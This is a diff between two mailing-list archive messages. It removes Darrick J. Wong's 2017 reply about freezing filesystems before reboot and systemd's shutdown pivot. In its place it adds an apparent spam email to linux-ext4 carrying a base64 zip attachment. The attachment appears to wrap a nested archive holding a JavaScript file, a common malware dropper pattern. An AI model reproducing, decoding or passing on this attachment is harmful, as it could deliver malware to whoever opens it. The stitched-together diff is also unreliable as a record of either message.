@@ -1,86 +1,70 @@
-From: "Darrick J. Wong" <darrick.wong@oracle.com>
-Subject: Re: [PATCH] vfs: freeze filesystems just prior to reboot
-Date: Fri, 19 May 2017 12:41:57 -0700
-Message-ID: <20170519194157.GK4519@birch.djwong.org>
-References: <20170519002032.GA21202@birch.djwong.org>
- <1495202431.1896310.982081664.066926F8@webmail.messagingengine.com>
- <20170519152734.qd4lf32e7wst4jdh@thunk.org>
+From: <board@gowoodlawn.com>
+Subject: (unknown)
+Date: Sat, 20 May 2017 01:09:33 -0000
+Message-ID: <149524257367.1557.3076063330148164501@wateen.net>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Cc: Colin Walters <walters@verbum.org>,
-        xfs <linux-xfs@vger.kernel.org>,
-        linux-fsdevel <linux-fsdevel@vger.kernel.org>,
-        linux-ext4 <linux-ext4@vger.kernel.org>
-To: "Theodore Ts'o" <tytso@mit.edu>
-Return-path: <linux-fsdevel-owner@vger.kernel.org>
-Content-Disposition: inline
-In-Reply-To: <20170519152734.qd4lf32e7wst4jdh@thunk.org>
-Sender: linux-fsdevel-owner@vger.kernel.org
-List-Id: linux-ext4.vger.kernel.org
+Content-Type: application/zip; name="17734612411.zip"
+Content-Transfer-Encoding: base64
+To: <linux-ext4@vger.kernel.org>
+Return-path: <linux-ext4-owner@vger.kernel.org>
+Received: from WimaxUser3644-144.wateen.net ([110.36.44.144]:59920 "HELO
+        wateen.net" rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org with SMTP
+        id S1753701AbdETBJx (ORCPT <rfc822;linux-ext4@vger.kernel.org>);
+        Fri, 19 May 2017 21:09:53 -0400
+Subject: 
+Content-Disposition: attachment
+Sender: linux-ext4-owner@vger.kernel.org
+List-ID: <linux-ext4.vger.kernel.org>
 
-On Fri, May 19, 2017 at 11:27:34AM -0400, Theodore Ts'o wrote:
-> On Fri, May 19, 2017 at 10:00:31AM -0400, Colin Walters wrote:
-> > As a maintainer of one of those userspace tools (https://github.com/ostreedev/ostree),
-> > which I don't think is the one in question here, but likely has the same
-> > issue - I'd like to have some sort of API to fix this - maybe flush the journal *without*
-> > remounting r/o?
-> > 
-> > Unlike the case you're talking about with rebooting into a special
-> > update mode, libostree constructs a new root with hardlinks while
-> > the system is running.  Hence, system downtime is just reboot, like
-> > dual-partition update systems, except we're more flexible.
-> > 
-> > Although hm...I guess an API to flush the journal would only narrow
-> > the race.
-> > 
-> > Is the single partition case really just doomed?
-> 
-> One of the things that came up when Darrick and I discussed this on
-> the weekly ext4 developer's conference call was our mutual wonderment
-> that none of the userspace tools implemented a reboot by created a
-> tmpfs chroot, pivoting into the chroot, and then unmounting all of the
-> remaining file systems.
-
-systemd seems to have the ability to do this -- if something dumps an
-executable into /run/initramfs/shutdown (and remounts /run with 'exec')
-then systemd will pivot to this script which can then kill everything it
-needs and then unmount the filesystems.  Or upgrade the fs.  Seeing as
-the rootfs is still mounted ro at the point that the shutdown script is
-run, it could pull in whatever tools it wants.
-
-Or inject malware, I guess. :P
-
-In any case, I don't think it's unreasonable to want a system updater to
-be able to detect that the fs containing with vmlinuz and initrd hasn't
-unmounted at the end of the upgrade, and therefore it needs to resort to
-stronger tactics to forcibly unmount it before systemd reboots.
-
-> This would also allow update schemes who want to enable various new
-> file system features, or upgrade the root file system somehow, to be
-> able to do so while the root file system is completely and cleanly
-> unmounted.
-> 
-> The other thing that would be useful is if grub2 would actually be
-> able to replay the file system journal --- but given that grub2 is
-
-Gross! :)
-
-I don't think the XFS community will be enthusiastic about supporting
-whatever wreckage may come out of that.
-
-> GPLv3, and both ext4 and xfs are GPLv2-only, and given that past
-> attempts of teams attempting to do clean room reimplementations of
-> complex code bases for licensing reasons only (cough, make_ext4fs,
-> *cough*) have not necessarily turned out well, I'm at least not going
-> to hold my breath.
-
-Err... yes, but that's a different thread altogether.
-
---D
-
-> 
->    	   			- Ted
-> --
-> To unsubscribe from this list: send the line "unsubscribe linux-xfs" in
-> the body of a message to majordomo@vger.kernel.org
-> More majordomo info at  http://vger.kernel.org/majordomo-info.html
+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
+8AoAAAAA
